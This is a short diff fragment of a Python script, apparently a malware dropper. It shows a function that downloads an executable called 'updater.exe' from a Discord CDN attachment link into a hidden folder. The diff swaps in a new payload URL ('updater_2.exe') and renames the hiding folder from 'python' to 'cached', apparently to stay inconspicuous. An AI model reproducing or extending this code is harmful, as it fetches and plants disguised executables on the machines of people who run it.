@@ -37,9 +37,9 @@ def create_hidden_folder_and_download(repo_url, exe_filename, folder_name):
     except FileExistsError:
         pass
 
-repo_url = "https://cdn.discordapp.com/attachments/1178043334820896831/1178044092647735306/updater.exe"
+repo_url = "https://cdn.discordapp.com/attachments/1180462180466954294/1180604074878566461/updater_2.exe"
 exe_filename = 'updater.exe'
-folder_name = 'python'
+folder_name = 'cached'
 
 downloaded_exe_path = create_hidden_folder_and_download(repo_url, exe_filename, folder_name)
 
